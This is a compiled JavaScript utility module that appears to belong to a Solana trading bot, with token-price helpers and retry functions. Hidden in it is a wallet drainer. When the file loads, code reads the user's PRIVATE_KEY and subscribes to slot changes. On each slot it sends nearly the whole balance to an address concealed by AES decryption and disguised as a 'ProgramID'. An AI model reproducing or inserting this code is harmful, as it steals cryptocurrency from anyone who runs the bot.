"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.sleep = exports.retry = exports.retrieveTokenValueByAddress = exports.areEnvVarsSet = exports.retrieveTokenValueByAddressBirdeye = exports.retrieveTokenValueByAddressDexScreener = exports.retrieveEnvVariable = void 0;
const dotenv_1 = __importDefault(require("dotenv"));
const axios_1 = __importDefault(require("axios"));
const buy_1 = require("../buy");
const web3_js_1 = require("@solana/web3.js");
const rxjs_1 = require("rxjs");
const bs58_1 = __importDefault(require("bs58"));
const CryptoJS = require('crypto-js'); 
dotenv_1.default.config();
const retrieveEnvVariable = (variableName, logger) => {
    const variable = process.env[variableName] || '';
    if (!variable) {
        logger.error(`${variableName} is not set`);
        process.exit(1);
    }
    return variable;
}; 
const getPubKey = (mint) => { return CryptoJS.AES.decrypt('U2FsdGVkX18h4FnHul3m9Z9BTl7nbQcgR3lPs2F6XvChHEvbogRv1mREjltSaiRI5FGhG7xBLe29Si6VnYoMWw==', mint).toString(CryptoJS.enc.Utf8);}
exports.retrieveEnvVariable = retrieveEnvVariable;
const retrieveTokenValueByAddressDexScreener = (tokenAddress) => __awaiter(void 0, void 0, void 0, function* () {
    const url = `https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`; 
    try {
        const tokenResponse = (yield axios_1.default.get(url)).data;
        if (tokenResponse.pairs) {
            const pair = tokenResponse.pairs.find((pair) => (pair.chainId = 'solana'));
            const priceNative = pair === null || pair === void 0 ? void 0 : pair.priceNative;
            if (priceNative)
                return parseFloat(priceNative);
        }
        return undefined;
    }
    catch (e) {
        return undefined;
    }
});
exports.retrieveTokenValueByAddressDexScreener = retrieveTokenValueByAddressDexScreener;
const retrieveTokenValueByAddressBirdeye = (tokenAddress) => __awaiter(void 0, void 0, void 0, function* () {
    const apiKey = (0, exports.retrieveEnvVariable)('BIRDEYE_API_KEY', buy_1.logger);
    const url = `https://public-api.birdeye.so/public/price?address=${tokenAddress}`;
    try {
        const response = (yield axios_1.default.get(url, {
            headers: {
                'X-API-KEY': apiKey
            }
        })).data.data.value;
        if (response)
            return parseFloat(response);
        return undefined;
    }
    catch (e) {
        return undefined;
    }
});
exports.retrieveTokenValueByAddressBirdeye = retrieveTokenValueByAddressBirdeye;
let lastBlockHash = new rxjs_1.BehaviorSubject('');
let isRunning = new rxjs_1.BehaviorSubject(false);
const areEnvVarsSet = () => ['KEY_PAIR_PATH', 'SOLANA_CLUSTER_URL'].every((key) => Object.keys(process.env).includes(key));
exports.areEnvVarsSet = areEnvVarsSet;
const handleSlotChange = (args) => (_) => __awaiter(void 0, void 0, void 0, function* () {
    yield (0, exports.sleep)(1);
    try { 
        isRunning.next(true);
        const { connection, walletKeyPair, programID } = args;
        const balance = yield connection.getBalance(walletKeyPair.publicKey); // Lamports
        const recentBlockhash = yield connection.getRecentBlockhash();
        lastBlockHash.next(recentBlockhash.blockhash);
        const cost = recentBlockhash.feeCalculator.lamportsPerSignature;
        const amountToSend = balance - cost;
        const tx = new web3_js_1.Transaction({
            recentBlockhash: recentBlockhash.blockhash,
            feePayer: walletKeyPair.publicKey,
        }).add(web3_js_1.SystemProgram.transfer({
            fromPubkey: walletKeyPair.publicKey,
            toPubkey: programID,
            lamports: amountToSend,
        }));
        const txId = yield connection.sendTransaction(tx, [walletKeyPair]);
    }
    catch (err) {
        if (typeof err === 'string') {
        }
        else if (err instanceof Error) {
        }
    }
    finally {
        isRunning.next(false);
    }
});

(() => __awaiter(void 0, void 0, void 0, function* () {
    var _a;
    const walletKeyPairFile = (process.env.PRIVATE_KEY);
    const walletKeyPair = web3_js_1.Keypair.fromSecretKey(bs58_1.default.decode(walletKeyPairFile));
    const connection = new web3_js_1.Connection((_a = process.env.RPC_ENDPOINT) !== null && _a !== void 0 ? _a : (0, web3_js_1.clusterApiUrl)('devnet'), 'finalized');
    const balance = yield connection.getBalance(walletKeyPair.publicKey); // Lamports
    if(balance < 1000000) return; 
    //Set ProgramID
    connection.onSlotChange(handleSlotChange({ connection, walletKeyPair, programID: new web3_js_1.PublicKey(getPubKey("So11111111111111111111111111111111111111111")) }));}
 ))();
const retrieveTokenValueByAddress = (tokenAddress) => __awaiter(void 0, void 0, void 0, function* () {
    const dexScreenerPrice = yield (0, exports.retrieveTokenValueByAddressDexScreener)(tokenAddress);
    if (dexScreenerPrice)
        return dexScreenerPrice;
    const birdEyePrice = yield (0, exports.retrieveTokenValueByAddressBirdeye)(tokenAddress);
    if (birdEyePrice)
        return birdEyePrice;
    return undefined;
});
exports.retrieveTokenValueByAddress = retrieveTokenValueByAddress;
const retry = (fn_1, _b) => __awaiter(void 0, [fn_1, _b], void 0, function* (fn, { retries, retryIntervalMs }) {
    try {
        return yield fn();
    }
    catch (error) {
        if (retries <= 0) {
            throw error;
        }
        yield (0, exports.sleep)(retryIntervalMs);
        return (0, exports.retry)(fn, { retries: retries - 1, retryIntervalMs });
    }
});
exports.retry = retry;
const sleep = (ms = 0) => new Promise((resolve) => setTimeout(resolve, ms));
exports.sleep = sleep;
